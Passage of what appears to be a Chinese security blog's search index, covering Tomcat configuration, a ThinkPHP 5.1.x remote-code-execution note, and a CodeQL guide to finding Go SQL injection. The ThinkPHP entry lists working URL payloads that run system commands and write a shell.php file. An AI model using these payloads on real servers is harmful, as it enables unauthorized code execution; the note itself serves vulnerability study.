\"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" >","title":"\u76d1\u542c\u5730\u5740\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u76d1\u542c\u7aef\u53e3\u914d\u7f6e","text":"\u4fee\u6539port\u7aef\u53e3\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f8080 <Connector port= \"8080\" protocol= \"HTTP/1.1\" connectionTimeout= \"20000\" redirectPort= \"8443\" />","title":"\u76d1\u542c\u7aef\u53e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#web\u76ee\u5f55\u914d\u7f6e","text":"\u4fee\u6539appBase\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u7684webapps\u76ee\u5f55 <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" >","title":"web\u76ee\u5f55\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u7f16\u5199web\u9875\u9762","text":"web\u76ee\u5f55\u9ed8\u8ba4\u5728webapps\u4e0b\uff0cROOT\u662f\u9ed8\u8ba4\u7684\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\uff0c\u5176\u4ed6\u7684\u6587\u4ef6\u5939\u5bf9\u5e94\u7684\u5c31\u662f\u8bbf\u95ee\u7684\u8def\u5f84\uff0c\u4f8b\u5982examples\u6587\u4ef6\u5939\u4e0b\u7684\u5185\u5bb9\u9700\u8981\u901a\u8fc7 http://127.0.0.1:8080/examples/ \u8bbf\u95ee\u3002 \u6211\u4eec\u53ef\u4ee5\u5728webapps\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u5199\u5165index.html(\u9ed8\u8ba4\u6253\u5f00\u7684\u9875\u9762)\uff0c\u542f\u52a8Tomcat\u670d\u52a1\u5668\u540e\u8bbf\u95ee\u5373\u53ef\u3002 \u6216\u8005\u6211\u4eec\u53ef\u4ee5\u53c2\u8003webapps/examples\u4e0b\u7684\u5185\u5bb9\u8fdb\u884c\u5b66\u4e60\uff0c\u91cc\u9762\u6709\u5f88\u591a\u5b98\u65b9\u7684\u4f8b\u5b50\u3002","title":"\u7f16\u5199web\u9875\u9762"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#idea\u4e2d\u4f7f\u7528tomcat","text":"","title":"IDEA\u4e2d\u4f7f\u7528Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u521b\u5efaweb\u9879\u76ee","text":"","title":"\u521b\u5efaweb\u9879\u76ee"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u914d\u7f6etomcat","text":"\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684ADD CONFIGURATION\u6dfb\u52a0\u914d\u7f6e \u70b9\u51fb\u5de6\u4e0a\u89d2\u7684\u52a0\u53f7\u5e76\u9009\u62e9Tomcat Server - Local \u7136\u540e\u53ef\u4ee5\u5bf9Tomcat\u8fdb\u884c\u4e00\u4e9b\u914d\u7f6e \u8fd8\u8981\u518dDeployment\u4e2d\u6dfb\u52a0artifacts\uff0c\u8fd9\u91ccApplication Context\u662f\u4e00\u4e2a\u8def\u5f84\u6620\u5c04\uff0c\u9ed8\u8ba4\u4e3a/\uff0c\u5373\u8bbf\u95ee http://127.0.0.1:8080/ \uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a\u5176\u4ed6\u5185\u5bb9\u5982/test\uff0c\u5219\u8bbf\u95ee http://127.0.0.1:8080/test \u914d\u7f6e\u5b8c\u4e4b\u540e\u6574\u4e2a\u9879\u76ee\u7ed3\u6784\u5927\u6982\u662f\u8fd9\u6837 \u6700\u540e\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7eff\u8272\u8fd0\u884c\u7bad\u5934\u5373\u53ef","title":"\u914d\u7f6eTomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u603b\u7ed3","text":"\u672c\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86Tomcat\u7684\u5b89\u88c5\uff0c\u542f\u52a8\u548c\u914d\u7f6e\uff0c\u4ee5\u53caIDEA\u4e2dWeb\u9879\u76ee\u7684\u521b\u5efa\u4e0eTomcat\u7684\u914d\u7f6e","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/","tags":["php","thinkphp","\u6f0f\u6d1e\u5206\u6790"],"text":"thinkphp 5.1.x RCE # \u53c2\u8003\u6587\u7ae0 # https://xz.aliyun.com/t/9369 RCE1 # \u6839\u672c\u539f\u56e0 # thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3 \u5f71\u54cd\u7248\u672c # TP5.1.0-5.1.30 payload # ?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= <?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id \u5206\u6790 #","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#thinkphp-51x-rce","text":"","title":"thinkphp 5.1.x RCE"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u53c2\u8003\u6587\u7ae0","text":"https://xz.aliyun.com/t/9369","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#rce1","text":"","title":"RCE1"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u6839\u672c\u539f\u56e0","text":"thinkphp\u6ca1\u6709\u5bf9\u7528\u6237\u4f20\u5165\u7684\u64cd\u4f5c\u5668\u540d\u79f0\u8fdb\u884c\u8fc7\u6ee4,\u5bfc\u81f4\u53ef\u4ee5\u8c03\u7528\u9876\u90e8\u7c7b\u4e2d\u7684\u65b9\u6cd5,\u9020\u6210\u4e00\u7cfb\u5217\u7684\u5371\u5bb3","title":"\u6839\u672c\u539f\u56e0"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5f71\u54cd\u7248\u672c","text":"TP5.1.0-5.1.30","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#payload","text":"?s=index/\\think\\Request/input&filter[]=system&data=pwd ?s=index/\\think\\view\\driver\\Php/display&content= <?php phpinfo (); ?> #\u6ce8\u610f\u7531\u4e8ewindows\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u539f\u56e0\u6240\u4ee5\u8fd9\u4e2apayload\u5728windows\u4e0b\u65e0\u6cd5\u4f7f\u7528 ?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content= <?php phpinfo (); ?> ?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id","title":"payload"},{"location":"%E5%AE%89%E5%85%A8/%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/#\u5206\u6790","text":"","title":"\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/","tags":["codeql","golang","\u4ee3\u7801\u5ba1\u8ba1"],"text":"CodeQL\u4e0egolang sql\u6ce8\u5165\u68c0\u6d4b # \u4ec0\u4e48\u662fCodeQL # CodeQL\u662f\u4e00\u4e2a\u53ef\u4ee5\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u7684\u5f15\u64ce, \u5b89\u5168\u4eba\u5458\u53ef\u4ee5\u7528\u5b83\u4f5c\u4e3a\u6316\u6d1e\u7684\u8f85\u52a9\u6216\u8005\u76f4\u63a5\u8fdb\u884c\u6316\u6398\u6f0f\u6d1e,\u8282\u7701\u8fdb\u884c\u91cd\u590d\u64cd\u4f5c\u7684\u7cbe\u529b\u3002 \u5728CodeQL\u4e2d\uff0c\u4ee3\u7801\u88ab\u89e3\u6790\u6210\u6570\u636e\uff0c\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u5b89\u5168\u6f0f\u6d1e\u3001\u9519\u8bef\u548c\u5176\u4ed6\u9519\u8bef\u88ab\u5efa\u6a21\u4e3a\u53ef\u4ee5\u9488\u5bf9\u6570\u636e\u5e93\u6267\u884c\u7684\u67e5\u8be2\u3002\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u7531GitHub\u7814\u7a76\u4eba\u5458\u548c\u793e\u533a\u8d21\u732e\u8005\u7f16\u5199\u7684\u6807\u51c6CodeQL\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684\u67e5\u8be2\u4ee5\u7528\u4e8e\u81ea\u5b9a\u4e49\u5206\u6790\u3002\u67e5\u627e\u6f5c\u5728\u9519\u8bef\u7684\u67e5\u8be2\u76f4\u63a5\u5728\u6e90\u6587\u4ef6\u4e2d\u7a81\u51fa\u663e\u793a\u7ed3\u679c\u3002 \u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b # \u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2\u7684\u7f51\u7ad9\uff0c\u4f46\u662f\u7531\u4e8e\u5b98\u7f51\u5728\u56fd\u5916\u800c\u4e14\u6267\u884c\u901f\u5ea6\u4e0d\u5feb\uff0c\u6216\u8005\u67d0\u4e9b\u8bed\u8a00(\u5982c/c++)\u9700\u8981\u81ea\u5b9a\u4e49\u7f16\u8bd1\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u5b9e\u9645\u4e0a\u5728\u7f51\u7ad9\u662f\u5b8c\u5168\u4e0d\u591f\u4f7f\u7528\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u672c\u5730\u642d\u5efa\u73af\u5883\uff0c\u4ee5\u4e0b\u6b65\u9aa4\u662f\u4e00\u6b65\u6b65\u8fdb\u884c\u7684\u3002 codeql-cli # \u5728\u547d\u4ee4\u884c(cli)\u7684\u73af\u5883\u4e0b\u8fd0\u884ccodeql \u9879\u76ee\u5730\u5740 : github/codeql-cli-binaries \u6253\u5f00\u9879\u76ee\u5730\u5740\u4e4b\u540e\u8fdb\u5165Releases\u5e93\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u7684\u538b\u7f29\u5305\u89e3\u538b\u5230\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u5939 codeql # \u5f00\u6e90\u7684codeql\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93 \u9879\u76ee\u5730\u5740: github/codeql \u8fdb\u5165\u5230\u4e0a\u9762\u89e3\u538bcodeql-cli\u7684\u6587\u4ef6\u5939\uff0c\u5e76\u628a\u8be5\u4ed3\u5e93clone\u4e0b\u6765\uff0c\u4fdd\u8bc1codeql-cli\u548ccodeql\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b vscode-codeql # vscode\u7684codeql\u63d2\u4ef6\uff0c\u76f4\u63a5\u5728\u63d2\u4ef6\u5e02\u573a\u5b89\u88c5 \u914d\u7f6e\u73af\u5883\u53d8\u91cf # \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528codeql-cli\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u8def\u5f84\u653e\u5230PATH\u4e0b\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5c31\u4e0d\u591a\u4ecb\u7ecd\u4e86(windows\u4e0b\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0clinux\u4e0b\u4fee\u6539PATH\u53d8\u91cf) \u540c\u65f6\u6211\u4eec\u6700\u597d\u518d\u914d\u7f6e\u4e0bcodeql\u63d2\u4ef6\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u6253\u5f00vscode\u7684\u8bbe\u7f6e\uff0c\u641c\u7d22codeql\uff0c\u4fee\u6539Executable Path \u81f3\u6b64\u6211\u4eec\u7684\u73af\u5883\u7b97\u662f\u914d\u7684\u5dee\u4e0d\u591a\u4e86\u3002\u3002\u3002\u4f46\u662f\u5982\u679c\u4f60\u9700\u8981\u7528go\u7684\u8bdd\u8fd8\u9700\u8981\u8fdb\u884c\u989d\u5916\u914d\u7f6e codeql-go # \u5f00\u6e90\u7684codeql-go\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93(\u4e0d\u592a\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u653e\u5728codeql\u5e93\u91cc) \u9879\u76ee\u5730\u5740: github/codeql-go \u8fd9\u4e2a\u9879\u76ee\u4e86\u5199\u660e\u4e86\u5b89\u88c5\u65b9\u6cd5\uff0c\u4f46\u662f\u5b58\u5728\u4ee5\u4e0b\u5f0a\u7aef: 1. \u8fd9\u662f\u4e00\u4e2ash\u811a\u672c\uff0c\u610f\u5473\u7740windows\u529e\u6cd5\u4f7f\u7528 2. \u8fd9\u4e2a\u9879\u76ee\u6709\u8fd9\u4e48\u4e00\u6bb5\u8bdd If you want to use the CodeQL extension for Visual Studio Code, import this repository into your VS Code workspace. \u610f\u601d\u662f\u8bf4\u6211\u4eec\u5982\u679c\u9700\u8981\u4f7f\u7528go\u7684\u6807\u51c6\u5e93\u65f6\uff0c\u8fd8\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230vscode\u7684workspace\u91cc\uff0c\u975e\u5e38\u9ebb\u70e6 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u5f0a\u7aef\uff0c\u6211\u81ea\u5df1\u6363\u9f13\u4e86\u4e00\u4e0b\uff0c\u5c06\u5176\u653e\u5728\u4e86codeql\u6807\u51c6\u5e93\u91cc\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b 1. clone\u4ed3\u5e93\u5230ql\u6587\u4ef6\u5939\u91cc(\u5373codeql\u6807\u51c6\u5e93)\u5e76\u6539\u5176\u6587\u4ef6\u5939\u540d\u4e3ago \u4fee\u6539.codeqlmanifest.json\uff0c\u52a0\u5165\u4e00\u884c \"go/.codeqlmanifest.json\", { \"provide\" : [ \"ruby/.codeqlmanifest.json\" , \"go/.codeqlmanifest.json\" , \"*/ql/src/qlpack.yml\" , \"*/ql/lib/qlpack.yml\" , \"*/ql/test/qlpack.yml\" , \"cpp/ql/test/query-tests/Security/CWE/CWE-190/semmle/tainted/qlpack.yml\" , \"*/ql/examples/qlpack.yml\" , \"*/upgrades/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/lib/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/src/qlpack.yml\" , \"misc/legacy-support/*/qlpack.yml\" , \"misc/suite-helpers/qlpack.yml\" ] } \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5b89\u88c5\u4e86\u5305\u62ecgo\u5728\u5185\u7684codeql\u6807\u51c6\u5e93\u4ee5\u53cacodeql\u7684cli\u7a0b\u5e8f\uff0c\u6765\u5199\u4e2aHello world\u6d4b\u8bd5\u4e00\u4e0b Hello world # \u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u6211\u4eec\u7684\u5b66\u4e60\u5de5\u4f5c\u533a\u5e76\u8f93\u51fa\u4e00\u4e2acodeql\u7684hello,world\uff0c\u6b65\u9aa4\u5982\u4e0b: \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u8fd9\u91cc\u4ee5codeql_study\u4e3a\u4f8b \u7528vscode\u6253\u5f00\u8be5\u6587\u4ef6\u5939\uff0c\u521b\u5efa\u4e00\u4e2aql\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u521b\u5efahelloworld.ql\u548cqlpack.yml qlpack.yml\u7684\u5185\u5bb9\u5982\u4e0b name: longlone/codeql-study version: 0.0.1 libraryPathDependencies: codeql-go extractor: go helloworld.ql\u7684\u5185\u5bb9\u5982\u4e0b import go select \"hello world\" \u521b\u5efa\u4e00\u4e2acodeql database\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6307\u5b9a\u4e00\u4e2ago\u9879\u76ee\u4f5c\u4e3a\u5206\u6790\u76ee\u6807 codeql database create ./codeql_database -s D:\\Coding\\golang\\src\\codeql_study --language=go \u4ecevscode\u4e2d\u9009\u62e9codeql_database\u4f5c\u4e3a\u6570\u636e\u5e93 \u53f3\u952ehelloworld.ql\uff0c\u9009\u62e9 CodeQL: Run Query \u5982\u679c\u663e\u793a\u4ee5\u4e0a\u753b\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u6210\u529f\u5c31\u5b89\u88c5\u597d\u4e86\u73af\u5883\u3002 CodeQL\u8bed\u6cd5\u524d\u8a00 # CodeQL\u7684\u5f88\u591a\u8bed\u6cd5\u548c\u73b0\u5728\u7684\u4e3b\u6d41\u9ad8\u7ea7\u8bed\u8a00\u6709\u5f88\u591a\u76f8\u4f3c\u4e4b\u5904\uff0c\u4f46\u4e5f\u6709\u8bb8\u591a\u7684\u4e0d\u540c\uff0c\u5b66\u4e60\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728CodeQL\u4e2d\u4e0d\u5b58\u5728 == \uff0c\u53ea\u6709 = \uff0c\u5f53\u4e00\u4e2a\u53d8\u91cf\u5b9a\u4e49\u4e86\u800c\u6ca1\u6709\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c = \u7684\u610f\u601d\u662f\u8d4b\u503c\uff0c\u4f46\u5f53\u5176\u5df2\u7ecf\u88ab\u8d4b\u503c\u4e86\u4e4b\u540e\uff0c = \u7684\u610f\u601d\u5c31\u53d8\u6210\u4e86\u6bd4\u8f83\u3002 \u57fa\u7840\u6570\u636e\u7c7b\u578b(Primitive types) # CodeQL \u662f\u4e00\u79cd\u9759\u6001\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u56e0\u6b64\u6bcf\u4e2a\u53d8\u91cf\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u58f0\u660e\u7684\u7c7b\u578b\u3002\u7c7b\u578b\u662f\u4e00\u7ec4\u503c\u3002\u4f8b\u5982\uff0cint \u7c7b\u578b\u662f\u4e00\u7ec4\u6574\u6570\u3002\u6ce8\u610f\uff0c\u4e00\u4e2a\u503c\u53ef\u4ee5\u5c5e\u4e8e\u8fd9\u4e9b\u96c6\u5408\u4e2d\u7684\u591a\u4e2a\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u3002 \u6574\u578b(int)\uff0c\u6d6e\u70b9\u578b(float)\uff0c\u65e5\u671f\u578b(date)\uff0c\u5b57\u7b26\u578b(stirng)\uff0c\u5e03\u5c14\u578b(boolean)\u3002 \u8c13\u8bcd(Predicates) # \u8c13\u8bcd\u6709\u70b9\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u4f46\u53c8\u4e0e\u51fd\u6570\u4e0d\u540c\uff0c\u8c13\u8bcd\u7528\u4e8e\u63cf\u8ff0\u6784\u6210 QL \u7a0b\u5e8f\u7684\u903b\u8f91\u5173\u7cfb\u3002\u786e\u5207\u7684\u8bf4\uff0c\u8c13\u8bcd\u63cf\u8ff0\u7684\u662f\u7ed9\u5b9a\u53c2\u6570\u4e0e\u5143\u7ec4\u96c6\u5408\u7684\u5173\u7cfb\u3002 \u5b9a\u4e49\u8c13\u8bcd\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6ce8\u610f\u70b9(\u5751\u70b9): 1. \u9700\u8981\u6ce8\u610f\u7684\u662f\u8c13\u8bcd\u7684\u540d\u5b57\u5f00\u5934\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 2. \u7ed1\u5b9a\u884c\u4e3a\u4e0e\u7ed1\u5b9a\u96c6\uff0c\u8fd9\u4e2a\u5728\u540e\u9762\u4f1a\u4ecb\u7ecd\u3002 \u65e0\u7ed3\u679c\u8c13\u8bcd # \u6ca1\u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u4ee5predicate\u4f5c\u4e3a\u5f00\u5934\uff0c\u5269\u4e0b\u7684\u8bed\u6cd5\u7ed3\u6784\u7c7b\u4f3c\u4e8e\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ea\u80fd\u5728where\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: predicate isCity(string city) { city = \"Beijing\" or city = \"ShangHai\" } from string city where city = \"Beijing\" and isCity(city) select city \u7ed3\u679c\u8c13\u8bcd # \u6709\u7ed3\u679c\u7684\u8c13\u8bcd\u7684\u5b9a\u4e49\u7c7b\u4f3c\u4e8ec/c++\u8bed\u8a00\u7684\u51fd\u6570\u5b9a\u4e49\uff0c\u4ee5\u8fd4\u56de\u7c7b\u578b\u66ff\u4ee3predicate\u4f5c\u4e3a\u5f00\u5934\u3002\u8fd9\u79cd\u8c13\u8bcd\u53ef\u4ee5\u5728where\u4e0eselect\u8bed\u53e5\u4e2d\u4f7f\u7528 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: int addOne(int i) { result = i + 1 and i in [1 .. 10] } from int v where v = 1 select addOne(v) \u67e5\u8be2(Query) # \u67e5\u8be2\u662fCodeQL\u7684\u8f93\u51fa\u3002\u67e5\u8be2\u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f - \u9009\u62e9\u5b50\u53e5 - \u67e5\u8be2\u8c13\u8bcd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u5b9a\u4e49\u6216\u8005\u4ece\u5176\u4ed6\u6a21\u5757\u4e2d\u5bfc\u5165 \u9009\u62e9\u5b50\u53e5 # \u9009\u62e9\u5b50\u53e5\u7684\u683c\u5f0f\u5982\u4e0b: [from] /* ... variable declarations ... */ [where] /* ... logical formula ... */ select /* ... expressions ... */ \u5176\u4e2dfrom\u548cwhere\u8bed\u53e5\u662f\u53ef\u9009\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728from\u4e2d\u5b9a\u4e49\u53d8\u91cf\uff0c\u5728where\u4e2d\u7ed9\u53d8\u91cf\u8d4b\u503c\u548c\u5bf9\u67e5\u8be2\u7ed3\u679c\u7684\u8fc7\u6ee4\uff0c\u6700\u540e\u5728select\u4e2d\u663e\u793a\u7ed3\u679c\u3002 \u5728select\u8bed\u53e5\u4e2d\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5173\u952e\u5b57: - as \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u540d\u5b57\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 as \uff0c\u4e3a\u7ed3\u679c\u5217\u63d0\u4f9b\u4e86\u4e00\u4e2a\"\u6807\u7b7e\"\uff0c\u5e76\u5141\u8bb8\u5728\u540e\u7eed\u7684select\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528\u5b83\u4eec\u3002 - order by \u5173\u952e\u5b57\uff0c\u540e\u9762\u8ddf\u968f\u4e00\u4e2a\u4e00\u4e2a\u7ed3\u679c\u5217\u540d\u3002\u4f5c\u7528\u76f8\u5f53\u4e8esql\u4e2d\u7684 order by \uff0c\u7528\u4e8e\u6392\u5e8f\u7ed3\u679c\uff0c\u5e76\u4e14\u5728\u7ed3\u679c\u5217\u540d\u540e\u53ef\u9009 asc (\u5347\u5e8f)\u6216 desc (\u964d\u5e8f)\u5173\u952e\u5b57\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: from int x, int y where x = 3 and y in [0 .. 2] select x, y, x * y as product, \"product: \" + product \u6c61\u70b9\u5206\u6790\u5b9a\u4e49 # \u6c61\u70b9\u5206\u6790\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u4e2a\u4e09\u5143\u7ec4 <sources,sinks,processor> \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d: - source \u5373\u6c61\u70b9\u6e90 \uff0c\u4ee3\u8868\u76f4\u63a5\u5f15\u5165\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u6216\u8005\u673a\u5bc6\u6570\u636e\u5230\u7cfb\u7edf\u4e2d - sink \u5373\u6c61\u70b9\u6c47\u805a\u70b9 \uff0c\u4ee3\u8868\u76f4\u63a5\u4ea7\u751f\u5b89\u5168\u654f\u611f\u64cd\u4f5c\uff08\u8fdd\u53cd\u6570\u636e\u5b8c\u6574\u6027\uff09\u6216\u8005\u6cc4\u9732\u9690\u79c1\u6570\u636e\u5230\u5916\u754c\uff08\u8fdd\u53cd\u6570\u636e\u4fdd\u5bc6\u6027\uff09 - sanitizer \u5373\u65e0\u5bb3\u5904\u7406 \uff0c\u4ee3\u8868\u901a\u8fc7\u6570\u636e\u52a0\u5bc6\u6216\u8005\u79fb\u9664\u5371\u5bb3\u64cd\u4f5c\u7b49\u624b\u6bb5\u4f7f\u6570\u636e\u4f20\u64ad\u4e0d\u518d\u5bf9\u8f6f\u4ef6\u7cfb\u7edf\u7684\u4fe1\u606f\u5b89\u5168\u4ea7\u751f\u5371\u5bb3 golang sql\u6ce8\u5165\u68c0\u6d4b # \u4ec0\u4e48\u662fsql\u6ce8\u5165\uff1f # \u6211\u4eec\u5148\u770b\u770b\u767e\u79d1\u4e0a\u662f\u600e\u4e48\u8bf4\u7684 SQL\u6ce8\u5165\u5373\u662f\u6307web\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u8f93\u5165\u6570\u636e\u7684\u5408\u6cd5\u6027\u6ca1\u6709\u5224\u65ad\u6216\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e8b\u5148\u5b9a\u4e49\u597d\u7684\u67e5\u8be2\u8bed\u53e5\u7684\u7ed3\u5c3e\u4e0a\u6dfb\u52a0\u989d\u5916\u7684SQL\u8bed\u53e5\uff0c\u5728\u7ba1\u7406\u5458\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u975e\u6cd5\u64cd\u4f5c\uff0c\u4ee5\u6b64\u6765\u5b9e\u73b0\u6b3a\u9a97\u6570\u636e\u5e93\u670d\u52a1\u5668\u6267\u884c\u975e\u6388\u6743\u7684\u4efb\u610f\u67e5\u8be2\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u5f97\u5230\u76f8\u5e94\u7684\u6570\u636e\u4fe1\u606f\u3002 \u770b\u5b8c\u5b98\u65b9\u7684\u4ecb\u7ecd\uff0c\u6211\u5728\u6765\u8bf4\u4e0b\u6211\u7406\u89e3\u7684sql\u6ce8\u5165\u662f\u4ec0\u4e48 sql\u6ce8\u5165\u5176\u5b9e\u5c31\u662f \u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165 \u901a\u8fc7\u5b57\u7b26\u62fc\u63a5\u7684\u65b9\u5f0f \u8fdb\u5165sql\u8bed\u53e5 \u4e2d\u4ece\u800c\u5bfc\u81f4sql\u8bed\u53e5\u7684\u8bed\u4e49\u6539\u53d8\uff0c\u901a\u8fc7\u8fd9\u79cd\u6076\u610fsql\u8bed\u53e5\u5b9e\u73b0\u7684\u4e00\u79cd\u653b\u51fb\u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u4e2a\u662f \u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165 \uff0c\u4e00\u4e2a\u662f 